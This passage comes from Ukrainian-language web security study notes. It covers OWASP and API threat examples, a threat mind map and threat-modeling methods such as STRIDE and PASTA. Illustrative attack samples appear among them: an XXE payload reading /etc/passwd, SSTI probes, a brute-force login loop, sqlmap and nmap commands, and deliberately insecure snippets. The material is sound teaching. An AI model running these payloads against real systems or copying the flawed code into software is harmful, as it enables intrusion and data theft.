    "items": [{"id": 1, "price": 100}],
    "status": "paid"  // Атакувальник встановлює status самостійно
}
```

#### **Price Manipulation**
```javascript
// Клієнтська валідація ціни (небезпечно)
function calculateTotal() {
    let price = document.getElementById('price').value;
    return price * quantity;  // Атакувальник може змінити price в DOM
}
```

### 🌐 **API-специфічні загрози**

#### **API1 - Broken Object Level Authorization**
```http
# Доступ до чужих ресурсів через API
GET /api/users/123/orders/456
# Користувач 123 отримує доступ до замовлення 456, яке може належати іншому користувачу
```

#### **API2 - Broken User Authentication**
```javascript
// Слабка JWT перевірка
const token = req.headers.authorization;
const decoded = jwt.decode(token);  // Небезпечно - немає верифікації підпису
```

#### **API3 - Excessive Data Exposure**
```json
// API повертає забагато інформації
{
    "user_id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "password_hash": "$2b$10$...",  // Не повинно бути в API response
    "ssn": "123-45-6789",           // Чутлива інформація
    "internal_notes": "VIP customer"
}
```

#### **API4 - Lack of Rate Limiting**
```python
# Відсутність rate limiting дозволяє brute force
@app.route('/api/login', methods=['POST'])
def login():
    # Немає обмежень на кількість спроб
    username = request.json['username']
    password = request.json['password']
    return authenticate(username, password)
```

### 📱 **Mobile Web App загрози**

#### **Insecure Data Storage**
```javascript
// Небезпечне зберігання в localStorage
localStorage.setItem('user_token', sensitive_token);
localStorage.setItem('credit_card', card_number);
```

#### **Insufficient Transport Layer Protection**
```javascript
// HTTP замість HTTPS
fetch('http://api.example.com/sensitive-data')
```

### ☁️ **Cloud-специфічні загрози**

#### **Server-Side Template Injection (SSTI)**
```python
# Вразливий Flask код
from flask import Flask, request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = f"Hello {name}!"  # Небезпечно
    return render_template_string(template)

# Payload атакувальника
# ?name={{7*7}}  // Результат: Hello 49!
# ?name={{config}}  // Витік конфігурації
```

#### **XML External Entity (XXE)**
```xml
<!-- Шкідливий XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
```

#### **Insecure Deserialization**
```python
# Небезпечна десеріалізація
import pickle
user_data = pickle.loads(request.data)  # Може виконати довільний код
```

---

## Методи атак та техніки

### 🎯 **Reconnaissance (Розвідка)**
```bash
# Інформаційна розвідка
nmap -sV target.com
whatweb target.com
dirb http://target.com/
gobuster dir -u http://target.com -w wordlist.txt
```

### 🔍 **Vulnerability Scanning**
```bash
# Автоматизоване сканування
nikto -h http://target.com
sqlmap -u "http://target.com/page?id=1" --dbs
```

### 🕳️ **Exploitation**
```python
# Приклад автоматизованої атаки
import requests

# Brute force login
for password in password_list:
    response = requests.post('/login', data={
        'username': 'admin',
        'password': password
    })
    if 'Welcome' in response.text:
        print(f"Password found: {password}")
        break
```

---

## Оцінка ризиків та впливу

### 📊 **CVSS Scoring**
**Common Vulnerability Scoring System:**
```
Base Score = f(Impact, Exploitability)

Impact Metrics:
- Confidentiality Impact
- Integrity Impact  
- Availability Impact

Exploitability Metrics:
- Attack Vector
- Attack Complexity
- Privileges Required
- User Interaction
```

### 🎨 **Risk Assessment Matrix**
```
                High Impact    Medium Impact    Low Impact
High Likelihood    CRITICAL      HIGH            MEDIUM
Med Likelihood     HIGH          MEDIUM          LOW
Low Likelihood     MEDIUM        LOW             LOW
```

### 💰 **Business Impact**
```
🚨 Data Breach - витік персональних даних
🚨 Financial Loss - прямі фінансові втрати
🚨 Reputation Damage - втрата довіри клієнтів
🚨 Regulatory Fines - штрафи регуляторів
🚨 Operational Disruption - порушення бізнес-процесів
```

---

## Захист та мітигація

### 🛡️ **Defense in Depth Strategy**

**Рівень 1 - Perimeter Security:**
```
✅ Web Application Firewall (WAF)
✅ DDoS Protection
✅ Rate Limiting
✅ IP Whitelisting/Blacklisting
```

**Рівень 2 - Application Security:**
```
✅ Input Validation
✅ Output Encoding
✅ Authentication & Authorization
✅ Session Management
```

**Рівень 3 - Data Security:**
```
✅ Encryption at Rest
✅ Encryption in Transit  
✅ Data Classification
✅ Access Controls
```

### 🔧 **Security Headers**
```http
# Comprehensive security headers
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

### 🔍 **Monitoring та Detection**
```python
# Security event monitoring
import logging

security_logger = logging.getLogger('security')

def log_security_event(event_type, user_id, details):
    security_logger.warning(f"SECURITY_EVENT: {event_type} | User: {user_id} | Details: {details}")

# Usage examples
log_security_event("FAILED_LOGIN", user_id, f"IP: {ip_address}, Attempts: {attempt_count}")
log_security_event("PRIVILEGE_ESCALATION", user_id, f"Attempted access to: {resource}")
log_security_event("SUSPICIOUS_ACTIVITY", user_id, f"Multiple rapid requests from: {ip_address}")
```

---

## Висновок

Веб-додатки стикаються з широким спектром загроз, від класичних ін'єкцій до сучасних business logic атак. Розуміння цих загроз є першим кроком до створення ефективної стратегії безпеки.

### 🎯 **Ключові принципи захисту:**
- **Never trust user input** - завжди валідувати вхідні дані
- **Principle of least privilege** - мінімальні необхідні дозволи
- **Defense in depth** - багаторівневий захист
- **Security by design** - безпека з самого початку
- **Continuous monitoring** - постійний моніторинг

### 📈 **Тренди загроз:**
- Зростання API атак
- Supply chain компрометації
- Cloud-native vulnerabilities
- AI/ML powered attacks
- Social engineering evolution

**Пам'ятайте:** Ландшафт загроз постійно еволюціонує, тому критично важливо залишатися в курсі нових атак та регулярно оновлювати заходи безпеки.

-----------------------------------------------------------------------------------------------------------------------------------------------------------

# 🌐 Типи загроз для веб-додатків

```
                                    🌐 ТИПИ ЗАГРОЗ ДЛЯ ВЕБ-ДОДАТКІВ
                                                    |
                    ┌───────────────────────────────┼───────────────────────────────┐
                    |                               |                               |
            🎯 OWASP TOP 10                 🕷️ CLIENT-SIDE              💼 BUSINESS LOGIC
                    |                               |                               |
        ┌───────────┼───────────┐                  |                               |
        |           |           |                  |                               |
   🔓 ACCESS    💉 INJECTION  🔐 CRYPTO         ┌───┼───┐                      ┌───┼───┐
    CONTROL         |         FAILURES          |   |   |                      |   |   |
        |           |             |             |   |   |                      |   |   |
    ┌───┼───┐   ┌───┼───┐     ┌───┼───┐        |   |   |                      |   |   |
    |   |   |   |   |   |     |   |   |        |   |   |                      |   |   |
   IDOR |  Path SQL| NoSQL   Weak| Hard-      XSS | CSRF|                    Race| Price|
   Priv | Trav  Inj| Inject  Enc | coded       |  |    |                    Cond| Manip|
   Esc  | ersal ion| ection  ryp | Creds      ┌┼──┼────┼┐                      | ulat |
        |          |         tion|            ||  |    ||                      | ion  |
        |          |             |            ||  |    ||                      |      |
    Vertical   Command       Missing      Refl-||Stored||DOM                 Workflow Bypass
    Horizontal Injection     Encryption   ected||  XSS |||                  Logic Flaws
    CORS Issues OS Commands  Poor Keys    XSS  ||     |||                  
                LDAP Inject  Weak Algos        ||     |||                  
                XML Inject   Insecure Trans    ||     |||                  
                             Data at Rest      ||     |||                  
                                              ||     |||                  
                                         Clickjacking||                   
                                         Session    ||                    
                                         Hijacking  ||                    
                                                   ||                     
                                                   ||                     
                             ┌─────────────────────┘│                     
                             |                      │                     
                        📱 MOBILE WEB          🌐 API THREATS              
                             |                      │                     
                    ┌────────┼────────┐            │                     
                    |        |        |            │                     
                Insecure  Insufficient  Weak    ┌──┼──┐                   
                Data      Transport    Crypto   |  |  |                   
                Storage   Protection   Mobile   |  |  |                   
                    |        |           |      |  |  |                   
                localStorage HTTP      Weak   API1| API2|                 
                sessionStorage       Random   Brkn| Brkn|                 
                Cookies             Number    Auth| User|                 
                                   Generation    | Auth|                 
                                                 |     |                 
                                              ┌──┼─────┼──┐              
                                              |  |     |  |              
                                           API3 |   API4 |  API5         
                                          Excess|   Rate |  Broken       
                                          Data  |   Limit|  Function     
                                          Expose|   ing  |  Level        
                                                |        |  Authorization
                                                |        |              
                                                |        |              
                            ┌───────────────────┼────────┼──────────────┐
                            |                   |        |              |
                    ☁️ CLOUD THREATS      🔧 ADVANCED       📊 ATTACK      🛡️ MITIGATION
                            |              TECHNIQUES         METHODS         STRATEGIES
                    ┌───────┼───────┐          |               |               |
                    |       |       |          |               |               |
                 SSTI    XXE    Deserialization |               |               |
            Template External   Insecure       |               |               |
            Injection Entity    Pickle/JSON    |               |               |
                |       |       Serialization  |               |               |
            Jinja2   XML       Python/Java     |               |               |
            Twig     Bomb      .NET Objects    |               |               |
            Smarty   XXE       PHP Serialize   |               |               |
                     DTD                       |               |               |
                     Billion                   |               |               |
                     Laughs                    |               |               |
                                              |               |               |
                                        ┌─────┼─────┐    ┌────┼────┐    ┌─────┼─────┐
                                        |     |     |    |    |    |    |     |     |
                                    Reconnaissance  |  Manual |Auto |  Defense|Security|
                                    Information     |  Testing|Scan |  in     |Headers |
                                    Gathering       |       | ning |  Depth  |       |
                                        |           |       |     |         |       |
                                    ┌───┼───┐      |  ┌────┼────┐|    ┌────┼────┐  |
                                    |   |   |      |  |    |    ||    |    |    |  |
                                   OSINT|Foot     |  Burp|OWASP||   WAF |Input|  |
                                   Google|print   |  Suite| ZAP ||      |Valid|  |
                                   Shodan|ing     |      |     ||      |ation|  |
                                   Wayback|       |  Manual|Auto||   Perimeter| |
                                   Machine|       |  Review|Scan||   Application||
                                          |       |       |    ||   Data      ||
                                      Port|       |  Code |Tool||   Security  ||
                                      Scanning    |  Review|s  ||            ||
                                      Directory   |       |   ||       ┌────┼┼─────┐
                                      Brute Force |  Static|Dyn||       |    ||     |
                                                 |  Analysis|am||    Monitoring| Incident|
                                                 |        |ic ||    Logging   | Response|
                                                 |  SAST  |DAST||    SIEM      | IR Plans|
                                                 |        |   ||    Alerting  | Forensics|
                                                 |        |   ||              |         |
                                           ┌─────┼────────┼───┼┼──────────────┼─────────┼─┐
                                           |     |        |   ||              |         | |
                                      🎯 RISK ASSESSMENT           📈 METRICS & KPI    💡 BEST PRACTICES
                                           |                                   |                 |
                                    ┌──────┼──────┐                     ┌─────┼─────┐      ┌────┼────┐
                                    |      |      |                     |     |     |      |    |    |
                                 CVSS   Impact  Likelihood            MTTD  MTTR  False    Secure| Security|
                                Scoring Business Technical            Mean  Mean  Positive  Coding| by      |
                                 Base   Critical Financial           Time  Time  Rate      Practices| Design |
                                Temporal High     Reputation         To    To    Coverage  Input    | Threat |
                                Environ Medium   Operational         Detect Respond       Validation| Model  |
                                mental  Low      Compliance          Incidents           Output    | Reviews|
                                        |                                                Encoding  |        |
                                    ┌───┼───┐                                          Authentication|   |
                                    |   |   |                                          Session Mgmt  |   |
                                Data Regulatory Downtime                              Error Handling |   |
                                Loss  Fines     Service                               Logging       |   |
                                PII   GDPR      Disruption                          Crypto        |   |
                                PHI   PCI-DSS   SLA                                Implementation |   |
                                Card  SOX       Breach                                           |   |
                                Data  HIPAA                                                      |   |
                                                                                                |   |
                                                                                            Security|
                                                                                            Testing |
                                                                                            SAST/DAST|
                                                                                            Pen Test |
                                                                                            Code Review
```

## 📋 Легенда Mind Map

### 🎯 **OWASP Top 10 Категорії**
- **🔓 Access Control** - порушення контролю доступу
- **💉 Injection** - ін'єкційні атаки
- **🔐 Crypto Failures** - криптографічні помилки
- **🏗️ Insecure Design** - небезпечний дизайн
- **⚙️ Misconfiguration** - неправильні налаштування
- **📦 Vulnerable Components** - вразливі компоненти
- **🔑 Auth Failures** - проблеми аутентифікації
- **🔧 Integrity Failures** - порушення цілісності
- **📊 Logging Failures** - проблеми логування
- **🌐 SSRF** - підробка серверних запитів

### 🕷️ **Client-Side загрози**
- **XSS** - Cross-Site Scripting (Reflected, Stored, DOM)
- **CSRF** - Cross-Site Request Forgery
- **Clickjacking** - обман кліків

### 💼 **Business Logic атаки**
- **Race Conditions** - стан гонки
- **Price Manipulation** - маніпуляція цінами
- **Workflow Bypass** - обхід бізнес-процесів

### 📱 **Mobile Web загрози**
- **Insecure Data Storage** - небезпечне зберігання
- **Insufficient Transport Protection** - слабкий захист передачі
- **Weak Mobile Crypto** - слабка мобільна криптографія

### 🌐 **API загрози**
- **API1** - Broken Object Level Authorization
- **API2** - Broken User Authentication
- **API3** - Excessive Data Exposure
- **API4** - Lack of Rate Limiting
- **API5** - Broken Function Level Authorization

### ☁️ **Cloud загрози**
- **SSTI** - Server-Side Template Injection
- **XXE** - XML External Entity
- **Deserialization** - небезпечна десеріалізація

### 🔧 **Advanced Techniques**
- **Reconnaissance** - розвідка
- **Manual Testing** - ручне тестування
- **Automated Scanning** - автоматизоване сканування

### 🛡️ **Mitigation Strategies**
- **Defense in Depth** - багаторівневий захист
- **Security Headers** - захисні заголовки
- **Monitoring & Incident Response** - моніторинг та реагування

### 🎯 **Risk Assessment**
- **CVSS Scoring** - оцінка вразливостей
- **Impact Assessment** - оцінка впливу
- **Likelihood Analysis** - аналіз ймовірності

### 📈 **Metrics & KPI**
- **MTTD** - Mean Time To Detection
- **MTTR** - Mean Time To Response
- **False Positive Rate** - рівень хибних спрацьовувань

### 💡 **Best Practices**
- **Secure Coding** - безпечне програмування
- **Security by Design** - безпека в дизайні
- **Security Testing** - тестування безпеки

---

## 🎨 Використання Mind Map

**Для навчання:**
- Структуроване розуміння всіх типів загроз
- Візуальні зв'язки між категоріями
- Швидкий пошук конкретних загроз

**Для планування безпеки:**
- Покриття всіх областей ризику
- Визначення пріоритетів захисту
- Розробка комплексної стратегії

**Для аудиту:**
- Перевірка всіх категорій загроз
- Систематичний підхід до тестування
- Документування знайдених проблем

-------------------------------------------------------------------------------------------------------------------------------------------


# Моделі загроз (Threat Models)

---

## Що таке Threat Modeling?

**Threat Modeling (Моделювання загроз)** - це структурований підхід до ідентифікації, оцінки та мітигації потенційних загроз безпеки в системі або додатку.

### 🎯 **Основні цілі:**
- **Проактивне виявлення** загроз на ранніх етапах розробки
- **Структурований аналіз** безпеки системи
- **Пріоритизація** заходів захисту
- **Комунікація** ризиків між командами

### 📊 **Ключові переваги:**
```
✅ Раннє виявлення вразливостей (shift-left security)
✅ Економія ресурсів на виправлення
✅ Покращення архітектури безпеки
✅ Відповідність стандартам та регуляціям
✅ Підвищення security awareness команди
```

---

## Основні компоненти Threat Model

### 🏗️ **1. Assets (Активи)**
**Що захищаємо:**
- **Data Assets** - персональні дані, фінансова інформація, IP
- **System Assets** - сервери, бази даних, APIs
- **Process Assets** - бізнес-процеси, алгоритми

**Приклад класифікації:**
```
🔴 CRITICAL: Платіжні дані, паролі, медичні записи
🟡 HIGH: Особисті дані, бізнес-логіка, внутрішні API
🟢 MEDIUM: Публічна інформація, логи, метадані
```

### 👤 **2. Threat Actors (Актори загроз)**
**Хто може атакувати:**

**External Attackers:**
```
🎯 Script Kiddies - низькокваліфіковані атакувальники
🎯 Cybercriminals - організовані злочинці
🎯 Nation-State Actors - державні хакери
🎯 Hacktivists - ідеологічно мотивовані групи
```

**Internal Threats:**
```
🎯 Malicious Insiders - зловмисні працівники
🎯 Compromised Accounts - скомпрометовані акаунти
🎯 Negligent Users - недбалі користувачі
```

### 🚪 **3. Attack Vectors (Вектори атак)**
**Як можуть атакувати:**
- **Network-based** - через мережу
- **Web-based** - через веб-інтерфейс
- **Physical** - фізичний доступ
- **Social Engineering** - соціальна інженерія

### 🛡️ **4. Countermeasures (Контрзаходи)**
**Як захищаємося:**
- **Preventive** - запобіжні заходи
- **Detective** - заходи виявлення
- **Corrective** - коригувальні заходи
- **Recovery** - заходи відновлення

---

## Методології Threat Modeling

### 🔷 **STRIDE - Microsoft Model**

**Акронім STRIDE:**
- **S** - Spoofing (Підробка ідентичності)
- **T** - Tampering (Несанкціонована зміна)
- **R** - Repudiation (Відмова від авторства)
- **I** - Information Disclosure (Розкриття інформації)
- **D** - Denial of Service (Відмова в обслуговуванні)
- **E** - Elevation of Privilege (Підвищення привілеїв)

**Застосування STRIDE:**
```
🔍 Spoofing Identity:
   - Weak authentication mechanisms
   - Missing certificate validation
   - Session hijacking vulnerabilities

🔍 Tampering with Data:
   - Input validation failures
   - Missing integrity checks
   - Insecure data transmission

🔍 Repudiation:
   - Insufficient logging
   - Missing digital signatures
   - Weak audit trails

🔍 Information Disclosure:
   - Data leakage through error messages
   - Insufficient access controls
   - Unencrypted sensitive data

🔍 Denial of Service:
   - Resource exhaustion attacks
   - Application layer DoS
   - Missing rate limiting

🔍 Elevation of Privilege:
   - Authorization bypass
   - Privilege escalation vulnerabilities
   - Missing security boundaries
```

**Приклад STRIDE аналізу для веб-додатка:**
```
Component: User Authentication System

S - Spoofing:
   🚨 Weak password policies
   🚨 Missing multi-factor authentication
   🛡️ Mitigation: Strong password policy + MFA

T - Tampering:
   🚨 Session tokens stored in localStorage
   🚨 Missing CSRF protection
   🛡️ Mitigation: Secure cookies + CSRF tokens

R - Repudiation:
   🚨 No audit logs for login attempts
   🛡️ Mitigation: Comprehensive audit logging

I - Information Disclosure:
   🚨 Detailed error messages in production
   🛡️ Mitigation: Generic error responses

D - Denial of Service:
   🚨 No rate limiting on login endpoint
   🛡️ Mitigation: Rate limiting + account lockout

E - Elevation of Privilege:
   🚨 Role-based access control gaps
   🛡️ Mitigation: Principle of least privilege
```

### 🍝 **PASTA - Process for Attack Simulation and Threat Analysis**

**7 етапів PASTA:**

#### **Stage 1: Define Objectives**
```
📋 Business Objectives:
   - Compliance requirements (PCI DSS, GDPR)
   - Risk tolerance levels
   - Security investment priorities

📋 Technical Objectives:
   - System performance requirements
   - Availability targets
   - Data protection goals
```

#### **Stage 2: Define Technical Scope**
```
🔧 Application Inventory:
   - Web applications
   - Mobile applications
   - APIs and microservices
   - Third-party integrations

🔧 Infrastructure Components:
   - Cloud services (AWS, Azure, GCP)
   - Network architecture
   - Database systems
   - Security controls
```

#### **Stage 3: Application Decomposition**
```
🏗️ Architecture Analysis:
   - Data flow diagrams
   - Trust boundaries
   - Entry and exit points
   - Authentication mechanisms

🏗️ Component Mapping:
   - Frontend components
   - Backend services
   - Data stores
   - External dependencies
```

#### **Stage 4: Threat Analysis**
```
🔍 Threat Intelligence:
   - Industry-specific threats
   - Emerging attack vectors
   - Threat actor profiles
   - Historical incidents

🔍 Attack Pattern Analysis:
   - OWASP Top 10
   - MITRE ATT&CK framework
   - CVE databases
   - Security advisories
```

#### **Stage 5: Vulnerability Assessment**
```
🛠️ Technical Assessment:
   - Static code analysis (SAST)
   - Dynamic testing (DAST)
   - Dependency scanning (SCA)
   - Infrastructure scanning

🛠️ Design Review:
   - Architecture security review
   - Code review processes
   - Configuration analysis
   - Policy compliance check
```

#### **Stage 6: Attack Modeling**
```
⚔️ Attack Scenarios:
   - Attack trees development
   - Kill chain analysis
   - Threat scenario simulation
   - Impact assessment

⚔️ Risk Calculation:
   Risk = Threat × Vulnerability × Impact
   - Likelihood estimation
   - Impact quantification
   - Risk matrix development
```

#### **Stage 7: Risk Analysis & Impact**
```
📊 Risk Prioritization:
   - Critical risk identification
   - Cost-benefit analysis
   - Mitigation roadmap
   - Monitoring strategy

📊 Reporting:
   - Executive summary
   - Technical findings
   - Remediation recommendations
   - Compliance mapping
```

### 🌊 **VAST - Visual, Agile, and Simple Threat Modeling**

**Два типи моделей VAST:**

#### **Application Threat Models**
```
🎯 Operational Focus:
   - Specific applications or services
   - Developer and architect audience
   - Technical implementation details
   - Code-level security issues

📋 Components:
   - Process flow diagrams
   - Threat scenarios
   - Security requirements
   - Test cases generation
```

#### **Architectural Threat Models**
```
🏢 Strategic Focus:
   - Enterprise-wide view
   - Business stakeholder audience
   - High-level business risks
   - Infrastructure security

📋 Components:
   - Business impact analysis
   - Compliance requirements
   - Investment prioritization
   - Policy development
```

**VAST Process Flow:**
```
1. 📊 Create Process Flow Diagram
   ↓
2. 🎯 Identify Threat Scenarios
   ↓
3. 🔍 Analyze Security Requirements
   ↓
4. 🧪 Generate Test Cases
   ↓
5. 📈 Create Business Impact Model
```

### 🐙 **OCTAVE - Operationally Critical Threat, Asset, and Vulnerability Evaluation**

**Три фази OCTAVE:**

#### **Phase 1: Build Asset-Based Threat Profiles**
```
🏗️ Organizational View:
   - Critical asset identification
   - Security requirements definition
   - Current protection strategies
   - Organizational vulnerabilities

👥 Stakeholder Involvement:
   - Senior management interviews
   - Operational area analysis
   - IT staff consultations
   - Asset owner discussions
```

#### **Phase 2: Identify Infrastructure Vulnerabilities**
```
🔧 Technical Analysis:
   - Network architecture review
   - System configuration analysis
   - Technology vulnerability assessment
   - Security tool effectiveness

📊 Gap Analysis:
   - Current vs. required security
   - Technology limitations
   - Process weaknesses
   - Resource constraints
```

#### **Phase 3: Develop Security Strategy and Plans**
```
📋 Risk Assessment:
   - Threat scenario development
   - Impact analysis
   - Probability estimation
   - Risk calculation

🎯 Mitigation Strategy:
   - Control recommendations
   - Implementation roadmap
   - Resource requirements
   - Success metrics
```

---

## Практичне застосування Threat Modeling

### 🛠️ **Інструменти для Threat Modeling**

#### **Microsoft Threat Modeling Tool**
```
✅ Безкоштовний інструмент від Microsoft
✅ Інтеграція з STRIDE методологією
✅ Автоматична генерація загроз
✅ Шаблони для різних архітектур

Особливості:
- DFD (Data Flow Diagram) редактор
- Threat generation engine
- Reporting capabilities
- Template library
```

#### **OWASP Threat Dragon**
```
✅ Open source рішення
✅ Web-based та desktop версії
✅ Підтримка різних методологій
✅ Collaborative features

Особливості:
- Cross-platform compatibility
- Git integration
- JSON export/import
- Community-driven development
```

#### **IriusRisk**
```
✅ Commercial enterprise platform
✅ Automated threat modeling
✅ Integration з DevOps tools
✅ Compliance reporting

Особливості:
- Risk quantification
- Automated countermeasure mapping
- API integration
- Custom rule creation
```

#### **ThreatSpec**
```
✅ Threat modeling as code
✅ Integration з source control
✅ Continuous threat modeling
✅ Documentation generation

Особливості:
- Code annotations
- Automated diagram generation
- CI/CD integration
- Version control
```

### 📊 **Data Flow Diagrams (DFD)**

**Основні елементи DFD:**

#### **External Entities (Зовнішні сутності)**
```
🔲 Представлення: Квадрат
🎯 Призначення: Джерела та приймачі даних
📝 Приклади:
   - Users (веб-користувачі)
   - External APIs (треті системи)
   - Administrators (адміністратори)
   - Mobile Apps (мобільні додатки)
```

#### **Processes (Процеси)**
```
⭕ Представлення: Коло
🎯 Призначення: Обробка даних
📝 Приклади:
   - Authentication Service
   - Payment Processing
   - Data Validation
   - Report Generation
```

#### **Data Stores (Сховища даних)**
```
📦 Представлення: Відкритий прямокутник
🎯 Призначення: Зберігання даних
📝 Приклади:
   - User Database
   - Session Store
   - Log Files
   - Configuration Files
```

#### **Data Flows (Потоки даних)**
```
➡️ Представлення: Стрілка з підписом
🎯 Призначення: Рух даних між елементами
📝 Приклади:
   - Login Credentials
   - Session Token
   - User Profile Data
   - Error Messages
```

**Приклад DFD для e-commerce системи:**
```
[User] ──login credentials──→ (Authentication) ──user session──→ [Session Store]
  │                              │
  │ ←──session token──           │ ←──user data──
  │                              │
  │ ──product request──→ (Product Service) ←──product data──→ [Product DB]
  │                              │
  │ ←──product list──            │
  │                              │
  │ ──order data──→ (Order Processing) ←──order history──→ [Order DB]
  │                              │
  │ ←──order confirmation──      │ ──payment request──→ [Payment Gateway]
```

### 🎯 **Trust Boundaries**

**Визначення Trust Boundaries:**
```
🚧 Security Perimeters:
   - Network boundaries (DMZ, internal network)
   - Application boundaries (microservices)
   - Process boundaries (user/kernel space)
   - Physical boundaries (cloud/on-premise)

🚧 Privilege Boundaries:
   - User/admin separation
   - Service account isolation
   - Data classification levels
   - API access controls
```

**Приклад Trust Boundaries:**
```
┌─────────────────────────────────────┐
│           DMZ Network               │
│  ┌─────────────────────────────┐   │ ← Trust Boundary 1
│  │      Web Application        │   │
│  │  ┌─────────────────────┐   │   │
│  │  │   User Session      │   │   │ ← Trust Boundary 2
│  │  └─────────────────────┘   │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
┌─────────────────────────────────────┐
│         Internal Network            │ ← Trust Boundary 3
│  ┌─────────────────────────────┐   │
│  │      Database Server        │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

---

## Процес розробки Threat Model

### 📋 **Step 1: Define Scope and Objectives**

**Questions to Ask:**
```
❓ What are we building?
   - Application type and purpose
   - Key business functions
   - Target users and use cases

❓ What are we worried about?
   - Critical assets to protect
   - Compliance requirements
   - Business impact scenarios

❓ What are we going to do about it?
   - Available resources
   - Timeline constraints
   - Risk tolerance
```

### 🏗️ **Step 2: Create Architecture Overview**

**Documentation Requirements:**
```
📊 System Architecture:
   - High-level components
   - Technology stack
   - Deployment model
   - Integration points

📊 Data Architecture:
   - Data types and sensitivity
   - Data flows and transformations
   - Storage locations
   - Retention policies

📊 Security Architecture:
   - Existing controls
   - Authentication mechanisms
   - Authorization models
   - Monitoring capabilities
```

### 🎯 **Step 3: Decompose Application**

**Decomposition Framework:**
```
🔍 Functional Decomposition:
   - User registration/authentication
   - Data processing workflows
   - Reporting and analytics
   - Administrative functions

🔍 Technical Decomposition:
   - Frontend components
   - API layers
   - Business logic services
   - Data access layers
   - External integrations

🔍 Trust Decomposition:
   - Internet-facing components
   - Internal network services
   - Administrative interfaces
   - Third-party services
```

### 🚨 **Step 4: Identify Threats**

**Threat Identification Methods:**

#### **Structured Brainstorming:**
```
👥 Team Approach:
   - Multi-disciplinary team (dev, security, ops)
   - Facilitated sessions
   - Time-boxed discussions
   - Documented outcomes

🧠 Thinking Techniques:
   - "What if" scenarios
   - Attack path analysis
   - Misuse case development
   - Red team perspective
```

#### **Framework-Based Analysis:**
```
📚 STRIDE per Element:
   - Apply STRIDE to each DFD element
   - Document applicable threats
   - Rate likelihood and impact
   - Identify existing controls

📚 Attack Trees:
   - Goal-oriented analysis
   - Logical decomposition
   - AND/OR relationships
   - Quantitative analysis
```

### 📊 **Step 5: Assess and Prioritize Risks**

**Risk Assessment Matrix:**
```
                 Low Impact    Medium Impact    High Impact
High Likelihood     MEDIUM         HIGH          CRITICAL
Med Likelihood      LOW           MEDIUM          HIGH
Low Likelihood      LOW            LOW           MEDIUM
```

**Risk Factors:**
```
🎯 Likelihood Factors:
   - Threat actor capability
   - Attack surface exposure
   - Existing controls effectiveness
   - Historical incident data

🎯 Impact Factors:
   - Financial loss potential
   - Regulatory consequences
   - Reputation damage
   - Operational disruption
```

### 🛡️ **Step 6: Define Countermeasures**

**Control Categories:**

#### **Preventive Controls:**
```
✅ Access Controls:
   - Authentication mechanisms
   - Authorization frameworks
   - Network segmentation
   - Input validation

✅ Protective Measures:
   - Encryption (at rest/in transit)
   - Secure coding practices
   - Security headers
   - Rate limiting
```

#### **Detective Controls:**
```
✅ Monitoring and Logging:
   - Security event logging
   - Anomaly detection
   - SIEM integration
   - Audit trails

✅ Testing and Scanning:
   - Vulnerability assessments
   - Penetration testing
   - Code reviews
   - Configuration audits
```

#### **Corrective Controls:**
```
✅ Incident Response:
   - Response procedures
   - Communication plans
   - Recovery processes
   - Lessons learned integration

✅ Remediation:
   - Patch management
   - Configuration fixes
   - Process improvements
   - Training programs
```

---

## DevSecOps Integration

### 🔄 **Continuous Threat Modeling**

**Integration Points:**
```
📋 Requirements Phase:
   - Security requirements definition
   - Threat model initiation
   - Risk acceptance criteria
   - Compliance mapping

💻 Design Phase:
   - Architecture threat modeling
   - Security control selection
   - Trust boundary definition
   - Attack surface analysis

🧪 Development Phase:
   - Code-level threat analysis
   - Security test case generation
   - Automated threat detection
   - Developer security training

🚀 Deployment Phase:
   - Infrastructure threat modeling
   - Configuration validation
   - Runtime protection setup
   - Monitoring implementation
```

### 🤖 **Automation in Threat Modeling**

**Automated Threat Generation:**
```python
# Приклад автоматизованого threat modeling
class ThreatModel:
    def __init__(self, application):
        self.application = application
        self.threats = []
        
    def analyze_components(self):
        for component in self.application.components:
            threats = self.generate_stride_threats(component)
            self.threats.extend(threats)
    
    def generate_stride_threats(self, component):
        threats = []
        
        # Spoofing threats
        if component.has_authentication():
            threats.append({
                'type': 'Spoofing',
                'description': f'Authentication bypass in {component.name}',
                'severity': 'High',
                'mitigation': 'Implement strong authentication'
            })
        
        # Tampering threats
        if component.handles_user_input():
            threats.append({
                'type': 'Tampering',
                'description': f'Input validation failure in {component.name}',
                'severity': 'Medium',
                'mitigation': 'Implement input validation'
            })
        
        return threats
```

**Threat Model as Code:**
```yaml
# threats.yml
threat_model:
  application: "E-commerce Platform"
  version: "1.0"
  
  components:
    - name: "User Authentication"
      type: "process"
      trust_level: "medium"
      
      threats:
        - id: "AUTH-001"
          category: "Spoofing"
          description: "Credential stuffing attack"
          severity: "High"
          likelihood: "Medium"
          impact: "High"
          
          mitigations:
            - "Multi-factor authentication"
            - "Account lockout policies"
            - "Rate limiting"
            
        - id: "AUTH-002"
          category: "Elevation of Privilege"
          description: "Session hijacking"
          severity: "High"
          likelihood: "Low"
          impact: "High"
          
          mitigations:
            - "Secure session management"
            - "HTTPS enforcement"
            - "Session timeout"
```

### 📊 **Metrics and KPIs**

**Threat Modeling Metrics:**
```
📈 Coverage Metrics:
   - % of components threat modeled
   - % of threats with mitigations
   - % of high-risk threats addressed
   - Threat model freshness (last update)

📈 Effectiveness Metrics:
   - Security issues found pre-production
   - Reduction in security incidents
   - Time to threat resolution
   - Cost of security issues prevented

📈 Process Metrics:
   - Threat modeling cycle time
   - Team participation rate
   - Training completion rate
   - Tool adoption metrics
```

---

## Висновок

Threat Modeling є критично важливою практикою для проактивного підходу до безпеки, яка дозволяє:

### 🎯 **Ключові переваги:**
- **Раннє виявлення** загроз та вразливостей
- **Структурований підхід** до аналізу безпеки
- **Ефективний розподіл** ресурсів безпеки
- **Покращення комунікації** між командами
- **Підвищення security awareness**

### 🚀 **Сучасні тренди:**
- **Automated threat modeling** - автоматизація процесів
